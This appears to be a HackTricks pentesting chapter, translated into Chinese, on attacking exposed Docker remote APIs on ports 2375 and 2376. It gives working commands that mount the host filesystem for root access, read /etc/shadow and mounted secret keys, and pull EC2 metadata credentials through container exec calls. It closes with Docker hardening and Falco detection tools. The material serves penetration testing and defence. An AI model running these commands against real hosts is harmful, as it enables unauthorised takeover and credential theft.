<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>2375, 2376 Pentesting Docker</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="2375-2376-pentesting-docker"><a class="header" href="#2375-2376-pentesting-docker">2375, 2376 Pentesting Docker</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h3 id="docker-基础"><a class="header" href="#docker-基础">Docker 基础</a></h3>
<h4 id="什么是"><a class="header" href="#什么是">什么是</a></h4>
<p>Docker 是 <strong>容器化行业</strong>的 <strong>前沿平台</strong>，引领着 <strong>持续创新</strong>。它使得应用程序的创建和分发变得轻而易举，涵盖从 <strong>传统到未来</strong> 的各类应用，并确保它们在不同环境中的 <strong>安全部署</strong>。</p>
<h4 id="基本-docker-架构"><a class="header" href="#基本-docker-架构">基本 Docker 架构</a></h4>
<ul>
<li><a href="http://containerd.io"><strong>containerd</strong></a>: 这是一个 <strong>核心运行时</strong>，负责 <strong>管理容器的生命周期</strong>。这包括处理 <strong>镜像传输和存储</strong>，以及监督容器的 <strong>执行、监控和网络</strong>。关于 containerd 的 <strong>更详细见解</strong>将在后续探讨。</li>
<li><strong>container-shim</strong> 在处理 <strong>无头容器</strong> 时扮演着关键角色，顺利接管 <strong>runc</strong> 在容器初始化后的工作。</li>
<li><a href="http://runc.io"><strong>runc</strong></a>: 以其 <strong>轻量级和通用的容器运行时</strong> 能力而闻名，runc 符合 <strong>OCI 标准</strong>。它被 containerd 用于 <strong>启动和管理容器</strong>，遵循 <strong>OCI 指南</strong>，并从最初的 <strong>libcontainer</strong> 发展而来。</li>
<li><a href="http://www.grpc.io"><strong>grpc</strong></a> 对于 <strong>促进 containerd 和 docker-engine 之间的通信</strong> 至关重要，确保 <strong>高效交互</strong>。</li>
<li><a href="https://www.opencontainers.org"><strong>OCI</strong></a> 在维护 <strong>运行时和镜像的 OCI 规范</strong> 中发挥着重要作用，最新的 Docker 版本 <strong>符合 OCI 镜像和运行时</strong> 标准。</li>
</ul>
<h4 id="基本命令"><a class="header" href="#基本命令">基本命令</a></h4>
<pre><code class="language-bash">docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect &lt;containerid&gt; #Get info of the contaienr
docker network ls #List network info
docker exec -it &lt;containerid&gt; /bin/sh #Get shell inside a container
docker commit &lt;cotainerid&gt; registry:5000/name-container #Update container
docker export -o alpine.tar &lt;containerid&gt; #Export container as tar file
docker save -o ubuntu.tar &lt;image&gt; #Export an image
docker ps -a #List running and stopped containers
docker stop &lt;containedID&gt; #Stop running container
docker rm &lt;containerID&gt; #Remove container ID
docker image ls #List images
docker rmi &lt;imgeID&gt; #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
</code></pre>
<h4 id="containerd"><a class="header" href="#containerd">Containerd</a></h4>
<p><strong>Containerd</strong> 是专门为满足 <strong>Docker 和 Kubernetes</strong> 等容器平台的需求而开发的。它旨在通过抽象操作系统特定的功能和系统调用，<strong>简化在各种操作系统上执行容器</strong> 的过程，包括 Linux、Windows、Solaris 等。Containerd 的目标是仅包含用户所需的基本功能，努力省略不必要的组件。然而，完全实现这一目标被认为是具有挑战性的。</p>
<p>一个关键的设计决策是 <strong>Containerd 不处理网络</strong>。网络被视为分布式系统中的一个关键元素，具有软件定义网络 (SDN) 和服务发现等复杂性，这些复杂性在不同平台之间差异显著。因此，Containerd 将网络方面的管理留给它所支持的平台。</p>
<p>虽然 <strong>Docker 利用 Containerd</strong> 来运行容器，但重要的是要注意 Containerd 仅支持 Docker 功能的一个子集。具体而言，Containerd 缺乏 Docker 中存在的网络管理能力，并且不支持直接创建 Docker swarm。这一区别突显了 Containerd 作为容器运行时环境的专注角色，将更专业的功能委托给它所集成的平台。</p>
<pre><code class="language-bash">#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info &lt;containerName&gt; #Get container info
ctr task start &lt;containerName&gt; #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach &lt;containerName&gt; #Get shell in running container
ctr task pause &lt;containerName&gt; #Stop container
ctr tasks resume &lt;containerName&gt; #Resume cotainer
ctr task kill -s SIGKILL &lt;containerName&gt; #Stop running container
ctr container delete &lt;containerName&gt;
</code></pre>
<h4 id="podman"><a class="header" href="#podman">Podman</a></h4>
<p><strong>Podman</strong> 是一个遵循 <a href="https://github.com/opencontainers">开放容器倡议 (OCI) 标准</a> 的开源容器引擎，由红帽开发和维护。它与 Docker 的不同之处在于几个独特的特性，特别是它的 <strong>无守护进程架构</strong> 和对 <strong>无根容器</strong> 的支持，使用户能够在没有根权限的情况下运行容器。</p>
<p>Podman 旨在与 Docker 的 API 兼容，允许使用 Docker CLI 命令。这种兼容性扩展到其生态系统，包括用于构建容器镜像的工具 <strong>Buildah</strong> 和用于图像操作（如推送、拉取和检查）的 <strong>Skopeo</strong>。有关这些工具的更多详细信息，请访问它们的 <a href="https://github.com/containers/buildah/tree/master/docs/containertools">GitHub 页面</a>。</p>
<p><strong>主要区别</strong></p>
<ul>
<li><strong>架构</strong>：与 Docker 的客户端-服务器模型和后台守护进程不同，Podman 在没有守护进程的情况下运行。这种设计意味着容器以启动它们的用户的权限运行，通过消除对根访问的需求来增强安全性。</li>
<li><strong>Systemd 集成</strong>：Podman 与 <strong>systemd</strong> 集成以管理容器，允许通过 systemd 单元进行容器管理。这与 Docker 主要用于管理 Docker 守护进程的 systemd 使用形成对比。</li>
<li><strong>无根容器</strong>：Podman 的一个关键特性是能够在发起用户的权限下运行容器。这种方法通过确保攻击者仅获得被攻陷用户的权限，而不是根访问，来最小化与容器漏洞相关的风险。</li>
</ul>
<p>Podman 的方法提供了一个安全且灵活的 Docker 替代方案，强调用户权限管理和与现有 Docker 工作流的兼容性。</p>
<p>{% hint style="info" %}
请注意，由于 podman 旨在支持与 docker 相同的 API，您可以使用与 docker 相同的命令来使用 podman，例如：</p>
<pre><code class="language-bash">podman --version
podman info
pdoman images ls
podman ls
</code></pre>
<p>{% endhint %}</p>
<h3 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h3>
<p>默认情况下，当启用时，远程 API 在 2375 端口上运行。该服务默认不需要身份验证，这使得攻击者能够启动一个特权的 docker 容器。通过使用远程 API，可以将主机 /（根目录）附加到容器，并读取/写入主机环境的文件。</p>
<p><strong>默认端口：</strong> 2375</p>
<pre><code>PORT    STATE SERVICE
2375/tcp open  docker
</code></pre>
<h3 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h3>
<h4 id="manual"><a class="header" href="#manual">Manual</a></h4>
<p>请注意，为了枚举 docker API，您可以使用 <code>docker</code> 命令或 <code>curl</code>，如以下示例所示：</p>
<pre><code class="language-bash">#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
</code></pre>
<p>如果您可以 <strong>使用 <code>docker</code> 命令联系远程 docker API</strong>，您可以 <strong>执行</strong> 任何 <strong>之前评论过的</strong> <a href="2375-pentesting-docker.html#basic-commands"><strong>docker</strong> 命令</a> 来与服务进行交互。</p>
<p>{% hint style="info" %}
您可以 <code>export DOCKER_HOST="tcp://localhost:2375"</code> 并 <strong>避免</strong> 在 docker 命令中使用 <code>-H</code> 参数
{% endhint %}</p>
<p><strong>快速权限提升</strong></p>
<pre><code class="language-bash">docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
</code></pre>
<p><strong>Curl</strong></p>
<p>有时你会看到 <strong>2376</strong> 用于 <strong>TLS</strong> 端点。我无法通过 docker 客户端连接到它，但可以使用 curl 进行连接。</p>
<pre><code class="language-bash">#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
</code></pre>
<p>如果您想要更多信息，可以在我复制命令的地方找到更多信息：<a href="https://securityboulevard.com/2019/02/abusing-docker-api-socket/">https://securityboulevard.com/2019/02/abusing-docker-api-socket/</a></p>
<h4 id="自动"><a class="header" href="#自动">自动</a></h4>
<pre><code class="language-bash">msf&gt; use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p &lt;PORT&gt; &lt;IP&gt;
</code></pre>
<h3 id="破坏"><a class="header" href="#破坏">破坏</a></h3>
<p>在以下页面中，您可以找到<strong>从docker容器中逃脱</strong>的方法：</p>
<p>{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
<a href="../linux-hardening/privilege-escalation/docker-security/">docker-security</a>
{% endcontent-ref %}</p>
<p>利用这一点，可以从容器中逃脱，您可以在远程机器上运行一个弱容器，从中逃脱并破坏该机器：</p>
<pre><code class="language-bash">docker -H &lt;host&gt;:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
</code></pre>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py</a></li>
</ul>
<h3 id="权限提升"><a class="header" href="#权限提升">权限提升</a></h3>
<p>如果您在使用 docker 的主机内部，您可以 <a href="../linux-hardening/privilege-escalation/#writable-docker-socket"><strong>阅读此信息以尝试提升权限</strong></a>。</p>
<h3 id="在运行的-docker-容器中发现秘密"><a class="header" href="#在运行的-docker-容器中发现秘密">在运行的 Docker 容器中发现秘密</a></h3>
<pre><code class="language-bash">docker ps [| grep &lt;kubernetes_service_name&gt;]
docker inspect &lt;docker_id&gt;
</code></pre>
<p>检查 <strong>env</strong>（环境变量部分）以查找秘密，您可能会发现：</p>
<ul>
<li>密码。</li>
<li>IP 地址。</li>
<li>端口。</li>
<li>路径。</li>
<li>其他……。</li>
</ul>
<p>如果您想提取文件：</p>
<pre><code class="language-bash">docker cp &lt;docket_id&gt;:/etc/&lt;secret_01&gt; &lt;secret_01&gt;
</code></pre>
<h3 id="securing-your-docker"><a class="header" href="#securing-your-docker">Securing your Docker</a></h3>
<h4 id="securing-docker-installation-and-usage"><a class="header" href="#securing-docker-installation-and-usage">Securing Docker installation and usage</a></h4>
<ul>
<li>您可以使用工具 <a href="https://github.com/docker/docker-bench-security">https://github.com/docker/docker-bench-security</a> 来检查您当前的 Docker 安装。</li>
<li><code>./docker-bench-security.sh</code></li>
<li>您可以使用工具 <a href="https://github.com/kost/dockscan">https://github.com/kost/dockscan</a> 来检查您当前的 Docker 安装。</li>
<li><code>dockscan -v unix:///var/run/docker.sock</code></li>
<li>您可以使用工具 <a href="https://github.com/genuinetools/amicontained">https://github.com/genuinetools/amicontained</a> 来检查容器在不同安全选项下的权限。这对于了解使用某些安全选项运行容器的影响非常有用：</li>
<li><code>docker run --rm -it r.j3ss.co/amicontained</code></li>
<li><code>docker run --rm -it --pid host r.j3ss.co/amicontained</code></li>
<li><code>docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained</code></li>
</ul>
<h4 id="securing-docker-images"><a class="header" href="#securing-docker-images">Securing Docker Images</a></h4>
<ul>
<li>您可以使用 <a href="https://github.com/quay/clair">https://github.com/quay/clair</a> 的 Docker 镜像来扫描您的其他 Docker 镜像并查找漏洞。</li>
<li><code>docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"</code></li>
<li><code>clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image</code></li>
</ul>
<h4 id="securing-dockerfiles"><a class="header" href="#securing-dockerfiles">Securing Dockerfiles</a></h4>
<ul>
<li>您可以使用工具 <a href="https://github.com/buddy-works/dockerfile-linter">https://github.com/buddy-works/dockerfile-linter</a> 来 <strong>检查您的 Dockerfile</strong> 并查找各种错误配置。每个错误配置将被分配一个 ID，您可以在这里找到 <a href="https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md">https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md</a> 如何修复每个错误。</li>
<li><code>dockerfilelinter -f Dockerfile</code></li>
</ul>
<p><img src="../.gitbook/assets/image%20(176).png" alt="" /></p>
<ul>
<li>您可以使用工具 <a href="https://github.com/replicatedhq/dockerfilelint">https://github.com/replicatedhq/dockerfilelint</a> 来 <strong>检查您的 Dockerfile</strong> 并查找各种错误配置。</li>
<li><code>dockerfilelint Dockerfile</code></li>
</ul>
<p><img src="../.gitbook/assets/image%20(212).png" alt="" /></p>
<ul>
<li>您可以使用工具 <a href="https://github.com/RedCoolBeans/dockerlint">https://github.com/RedCoolBeans/dockerlint</a> 来 <strong>检查您的 Dockerfile</strong> 并查找各种错误配置。</li>
<li><code>dockerlint Dockerfile</code></li>
</ul>
<p><img src="../.gitbook/assets/image%20(71).png" alt="" /></p>
<ul>
<li>您可以使用工具 <a href="https://github.com/hadolint/hadolint">https://github.com/hadolint/hadolint</a> 来 <strong>检查您的 Dockerfile</strong> 并查找各种错误配置。</li>
<li><code>hadolint Dockerfile</code></li>
</ul>
<p><img src="../.gitbook/assets/image%20(501).png" alt="" /></p>
<h4 id="logging-suspicious-activity"><a class="header" href="#logging-suspicious-activity">Logging Suspicious activity</a></h4>
<ul>
<li>您可以使用工具 <a href="https://github.com/falcosecurity/falco">https://github.com/falcosecurity/falco</a> 来检测 <strong>正在运行的容器中的可疑行为</strong>。</li>
<li>请注意以下部分 <strong>Falco 编译内核模块并插入</strong>。之后，它加载规则并 <strong>开始记录可疑活动</strong>。在这种情况下，它检测到启动了 2 个特权容器，其中 1 个具有敏感挂载，并且在几秒钟后检测到在其中一个容器内打开了一个 shell。</li>
</ul>
<pre><code class="language-bash">docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=&lt;NA&gt; command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=&lt;NA&gt; command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
</code></pre>
<h4 id="监控-docker"><a class="header" href="#监控-docker">监控 Docker</a></h4>
<p>您可以使用 auditd 来监控 docker。</p>
<h3 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h3>
<ul>
<li><a href="https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html">https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html</a></li>
<li><a href="https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc">https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc</a></li>
</ul>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/pentesting-compaq-hp-insight-manager.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/3128-pentesting-squid.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/pentesting-compaq-hp-insight-manager.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

